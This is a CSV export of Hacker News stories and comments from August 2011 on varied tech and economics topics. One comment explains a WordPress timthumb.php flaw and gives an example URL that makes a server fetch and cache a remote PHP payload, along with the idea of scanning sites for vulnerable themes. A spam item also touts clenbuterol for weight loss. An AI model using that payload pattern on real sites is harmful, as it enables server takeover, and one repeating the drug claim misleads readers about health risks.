ID,Type,Story,Parent,Points,Comments,Author,Title,URL,Content,Created
2835872,story,,,1,0,Johnbatosh,"Buy Clenbuterol to Cut Back Weight",http://www.l-thyroxine.com/2011/08/01/buy-clenbuterol-to-cut-back-weight/,"Clenbuterol  gained popularity after being termed as a weight reduction compound which shows great results. Termed as the pill for slimming people to attain size zero, this one is still actively involved in asthma medications.",1312261121
2835871,comment,2835346,2835648,1,0,desireco42,,,Agreed,1312261103
2835868,comment,2832949,2835807,1,0,divtxt,,,"Another 10-year old issue which has probably cost thousands of developer hours:<p>String.substring() leaks memory<p><a href=""http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4513622"" rel=""nofollow"">http://bugs.sun.com/bugdatabase/view_bug.do?bug_id=4513622</a>",1312261047
2835867,comment,2835288,2835288,2,0,tansey,,,"Very good find! Thank you for sharing.<p>I bought my theme from Theme Forest and it has this vulnerability. If you have a theme that you've purchased and contains this file, it would be helpful to post this on the theme's support forum.",1312260981
2835866,comment,2835288,2835831,4,0,patio11,,,"No, you can execute the script directly if you know or can guess the location of it, straight through your web browser.<p>Accessing<p><pre><code>  http://www.example.com/wordpress/wp-content/ themes/vulnerable-theme/thumb.php?src=flickr.com.example.org/payload.php 
</code></pre>
is sufficient to cause it to download payload.php and cache it.  Afterwards, you can access the PHP file in the same manner to execute it.<p>One could trivially make a list of signatures for vulnerable themes (for example, all the ones I paid for from a certain prominent Wordpress themes company), and then exploit any website whose main page matched a signature.  Alternatively, you could just speculatively hit a few hundred URLs on every domain you found.",1312260926
2835864,comment,2835383,2835822,7,0,baddox,,,"These days, I don't think rendering technology is what's holding us back from having realistic faces. I think the art and animation is just really hard to get right.",1312260899
2835863,story,,,4,3,nkurz,"Do the Math: Can Economic Growth Last?",http://physics.ucsd.edu/do-the-math/2011/07/can-economic-growth-last/,,1312260885
2835861,comment,2835656,2835806,7,0,gaika,,,"> invariably lead to a discussion of utility functions and slowly bore everyone<p>But that's the crux of the matter - both sides of the trade are getting some utility gain (otherwise the trade would not happen) and thus it is not a zero sum game.<p>It is still zero sum in short term dollars, which just obscures the subject for the people who equate utility with dollars.",1312260831
2835860,comment,2835383,2835614,4,0,lwat,,,"They haven't progressed at all since 2008 so I'm not really sure what they're actually doing",1312260806
2835859,comment,2835383,2835722,2,0,baddox,,,"Obviously not every 3D rendering technique in existence would be included in a short demo video.",1312260798
2835858,comment,2834718,2835266,1,0,jcr,,,"> It's currently reasonably infeasible for pirates to reverse engineer the application, to the extent that they can port it to a completely different OS and architecture.<p>I mean you no offense, but your statement is factually inaccurate. If a talented and dedicated reverse engineer wanted to put in the effort to create a port from binaries, it is certainly feasible. However, it is reasonably <i>unlikely</i> since it would require a good deal of work.",1312260797
2835857,comment,2835346,2835695,1,0,stephth,,,"I think <i>zen</i> is the keyword. Apps like textmate or this one or mac os/apps in general are not simple because it's cool to be simple - they just hide the power that's under the hood so your tired eyes and brain can focus on the task at hand. But ultimately it's about your own <i>zen</i>: whatever makes each one happier and more productive, be it eclipse, netbeans, vim or textmate.<p><i>I really want to break out of the terminal.</i><p>Have you tried MacVim?",1312260698
2835856,comment,2835015,2835434,1,0,Groxx,,,"But you wouldn't know that by seeing it.<p>Hm.  Seems we need a new term.  Spoilers tend to be things that people see, and immediately go ""OMG WHY DID YOU SHOW ME THAT"".  This is closer to ""huh. dragons."".  Maybe ""fridge horror""[1] is the closest?  A ""fridge spoiler""?<p>[1]: <a href=""http://tvtropes.org/pmwiki/pmwiki.php/Main/FridgeHorror"" rel=""nofollow"">http://tvtropes.org/pmwiki/pmwiki.php/Main/FridgeHorror</a>",1312260675
2835855,comment,2835694,2835694,5,0,quizbiz,,,"I never knew him or even knew of him until now. But it must be grand to pass on like that after a long meaningful life that impacted many others. I look forward to exploring his works.",1312260640
2835854,story,,,1,0,zachwaugh,"Indie filmmaker invents his own camera to shoot on",http://www.fastcodesign.com/1664622/the-secret-sauce-behind-bellflower-a-buzzy-indie-film-handmade-cameras,,1312260633
2835853,comment,2830998,2830998,1,0,vinodkd,,,"Great article.<p>I <i>had</i> to comment on this bit, tho:<p>""ordered sandwich platters from Costco""<p>Nice to see the White house doesn't splurge willy-nilly :))",1312260630
2835852,comment,2832538,2835733,3,0,nazgulnarsil,,,"why do you continue to deny your parent post?<p>QUOTE: ""the sellers have to be meeting genuine needs, or the buyers have to have the information necessary to make good determinations.""<p>both of your assertions are false.  markets tend toward equilibria you disagree with.  that you disagree with them doesn't make the needs ""non-genuine"", nor does it mean information asymmetry is a barrier to efficient markets.  correcting information asymmetry is itself subject to market forces.",1312260603
2835851,story,,,2,0,ben_teese,"New iOS Developers Shouldnt Use Interface Builder",http://blog.shinetech.com/2011/07/23/when-should-new-ios-developers-start-using-interface-builder/,,1312260601
2835850,comment,2833844,2834111,1,0,bluedanieru,,,"Just a guess, but doing what you describe to patent law would seriously and obviously harm the economy and isn't politically feasible, whereas insane copyright terms just give the assholes at Disney a license to print money, some of which finds its way back to the very corrupt bastards who extended the term in the first place.<p>Put another way, copyright as it is currently conceived degrades the creative space, but it isn't directly taking food out of people's mouths (it is, but in a less obvious way, and no one gives a shit about artists anyway).",1312260601
2835849,comment,2835281,2835281,8,0,SoftwareMaven,,,"The biggest problem we have is grouping by age instead of ability. Every core subject should be taught to people who are at the same level, even if it means 9 and 14 year olds in the same class.<p>Once you don't have to try teaching five different grade levels the same math (or other subject), 30 students become much more tolerable (not ideal, but manageable).",1312260556
2835848,comment,2833844,2834331,1,0,thyrsus,,,"That might not be true: <a href=""http://www.portfolio.com/news-markets/national-news/portfolio/2008/02/19/Poor-Give-More-to-Charity/"" rel=""nofollow"">http://www.portfolio.com/news-markets/national-news/portfoli...</a>",1312260553
2835847,comment,2835545,2835631,1,0,mike_h,,,"You should put your portfolio link in your user page.  I found a link by viewing your comments, but that'll get hidden if you post more.  Looks like nice work.",1312260511
2835846,comment,2835346,2835641,4,0,etcet,,,"Relevant HN post: <a href=""http://news.ycombinator.com/item?id=2797790"" rel=""nofollow"">http://news.ycombinator.com/item?id=2797790</a>",1312260492
2835845,story,,,12,1,seats,"Twitter takes 800 million in VC",http://online.wsj.com/article/SB10001424053111903520204576482351255849460.html?mod=googlenews_wsj,,1312260475
2835844,comment,2834334,2834839,18,0,nimblegorilla,,,"I don't think he looks like a douche, but I thought that picture was a stock photo of someone who was supposed to represent the criminal who started the whole mess.",1312260456
2835843,comment,2835346,2835671,1,0,rednaught,,,"Did you see this discussion a few months ago on an interesting idea for a modern GUI terminal? I don't know if there has been any further development but that definitely has thought provoking ideas.<p><a href=""http://news.ycombinator.com/item?id=2559734"" rel=""nofollow"">http://news.ycombinator.com/item?id=2559734</a>",1312260450
2835842,story,,,1,0,Ashton1077,"The Online Music Promotion now requires more efforts on the part of singer",http://nalysale.wordpress.com/2011/07/18/a-multi-utility-tool-the-online-music-promotion/,"The Online Music Promotion now requires more efforts on the part of singer. The new field of internet has totally changed the world of music promotion and publicity. The singer needs to use internet for promoting their music albums. For this they can take the help of social networking sites like Facebook.",1312260446
2835841,comment,2835820,2835820,7,0,agilo,,,"That one is my favorite: <a href=""http://visitsteve.com/404.html"" rel=""nofollow"">http://visitsteve.com/404.html</a>",1312260429
2835840,comment,2834334,2834666,3,0,rockya,,,"they aren't using an insurance company, they are paying for it out of pocket.",1312260422
2835839,comment,2835383,2835803,9,0,MtrL,,,"He, and his company, have done research into the field of SVOs to compliment megatexture.<p>I don't know enough to say if it's the same approach, but it's certainly the same field, so you'd expect him to know a fair bit about it.<p><a href=""http://www.youtube.com/watch?v=VpEpAFGplnI"" rel=""nofollow"">http://www.youtube.com/watch?v=VpEpAFGplnI</a>",1312260410
2835838,comment,2831646,2832897,1,0,BuddhaSource,,,"Its more about what you can do with your talent, age is not a major issue. All though we are looking for a full time commitment to justify for what we are building.<p>I will connect with you shortly :)",1312260389
2835837,comment,2835072,2835072,2,0,nilnullzip,,,"We put in a fix. Looks like it's working again. But there might be some continued instability. Please let us know if you find a persistent problem. Thanks!",1312260373
2835836,comment,2835288,2835831,1,0,nbpoole,,,"No. The timthumb.php script can be accessed directly by unauthenticated users.",1312260357
2835835,comment,2832638,2835775,1,0,podman,,,"As long as you pass on all of the costs onto the user, it works out pretty well and you should never lose any money on a customer.",1312260342
2835834,comment,2835288,2835288,2,0,qeorge,,,"FWIW: We had an older version of timthumb which uses preg_match instead of strpos, but suffers from the same flaw. The relevant line looks like this:<p><pre><code>    if (preg_match($site, $url_info['host']) == true) {
</code></pre>
Good catch, Mark.",1312260327
2835833,comment,2834334,2834660,9,0,rockya,,,"i emailed with brian and they are paying all of these out of pocket, even going forward. no insurance company involved. now that opens up a whole other can of worms...",1312260326
2835832,comment,2834889,2834889,1,0,SODaniel,,,"My guess is that Apple's move into the cloud space will be a pretty big boost for other online backup, sync and share companies; SpiderOak, Dropbox, Wuala etc.",1312260304
2835831,comment,2835288,2835288,1,0,lfx,,,"But to use this vulnerability at first cracker have to have registered user?
Or there are other way to upload images?",1312260288
2835830,comment,2831846,2831846,1,0,bobert22,,,"Here you are, commiserating over a failed business venture in your late 20's.  Clearly your life is over.  I mean the next 50 years of your life is utterly worthless, right?<p>Did you ever wonder why so many internet startups in the US are built by people in their 20's?  It comes down to a few reasons, but the primary reason is that very few people want to take a risk once they get into a lifestyle with kids, house payments, or private school.  People with health issues couldn't get health care coverage once it they left a company (the pre-existing condition clause), and others don't want to leave a career or reputation that took 20 years to build at the company they work for.<p>You're young, and presumably healthy.  You took one risk and failed.  Consider it an education more valuable than your schooling.  It's time to take another.  Figure out why the first failed and don't repeat the same mistakes.  Easier said then done, I know.  It's also true.  Why didn't hospitals buy your system?  Do you know?  Was the market locked up by a big data company?<p>Build something, start off small.  Show it to a few people.  Get some feedback.  A lot can be done in a weekend with python and django.  Listen to the comments.  Incorporate the best ones into your project, show it to a few more people.    Wash, rinse, repeat.  If you're project is a failure, you won't have wasted a year and a half working on it, but rather a few weekends.",1312260284
2835829,comment,2833604,2833841,1,0,jeberle,,,"I agree w/ you about 90% on this. However, you're painting w/ a broad brush including Awk and Sed. I imagine beyond 10 lines of Awk (gsub, anyone?) or about 1 line of Sed things get tenuous, and you would want to reach for Perl or Python. Sed & Awk are great for tiny stuff, but wear thin fast. The realm of text-only problems, about 15 to 40 lines of code is where I find Perl shines. Python is probably my favorite language, but it can be horribly clunky for these sorts of tasks.",1312260180
2835828,story,,,1,0,ricknellie,"Blur And Creativity",http://www.faircreditforamerica.com/fair-credit-for-america/11194,"At times, many people might argue that blurry portraits are not the best you can get. There are however some ideal situations where the use of blur can really work out well. For instance, blur can be used in modeling movements is a busy scene.",1312260154
2835827,comment,2835281,2835348,4,0,tokenadult,,,"<i>American teachers are very good. Possibly the best in the world.</i><p>The one unreplicated, not peer-reviewed blog post relied on for this assertion by HN participants who are not formally trained in social science research does not inspire confidence in this conclusion. I have lived in other countries, and I have worked with public school teachers in a country outside the United States.<p>The TIMSS studies<p><a href=""http://timss.bc.edu/"" rel=""nofollow"">http://timss.bc.edu/</a><p><a href=""http://nces.ed.gov/timss/"" rel=""nofollow"">http://nces.ed.gov/timss/</a><p>are the best international dataset on the issue, and no competent professional analyst of the TIMSS data has ever reached that conclusion. A recent analysis of the PISA studies conducted by the OECD<p><a href=""http://www.pisa.oecd.org/pages/0,2987,en_32252351_32235731_1_1_1_1_1,00.html"" rel=""nofollow"">http://www.pisa.oecd.org/pages/0,2987,en_32252351_32235731_1...</a><p>is a different international dataset, and its data suggest that the United States is underperforming in mathematics education of the most able mathematics students in the United States.<p><a href=""http://educationnext.org/teaching-math-to-the-talented/"" rel=""nofollow"">http://educationnext.org/teaching-math-to-the-talented/</a>",1312260130
2835826,comment,2835288,2835748,21,0,patio11,,,"Yes, turning off the ability to execute arbitrary code on your server through your web browser will, indeed, turn off the ability to execute arbitrary code on your server through your web browser.  I think that is a misfeature: if executing arbitrary code on your server could potentially do damage to your business (hint: yes), you should be SSHing into a terminal to do it.  That combo will be 500,000x more effective at securing your box than the best efforts of Wordpress, PHP, and the fifteen year-old designer who coded your lightbox plugin after Googling ""How to find file name in PHP"".<p>See also my comments last week about the (lack of) wisdom in embedding a ruby shell in a web application.",1312260128
2835825,comment,2832638,2833484,1,0,kayhi,,,"What is your daily or monthly budget for PPC?  What beneficial adjustments have you made since starting your campaign?",1312260123
2835824,comment,2832638,2833484,1,0,kayhi,,,"What is your daily or monthly budget for PPC?  What beneficial adjustments have you made since starting your campaign?",1312260072
2835823,comment,2835110,2835110,1,0,bigwally,,,"For $25 in AWS credit for everyone that enters, I'll have to enter my start-up. All it does it write ""Hello World!"" on the screen.<p>:)",1312260064
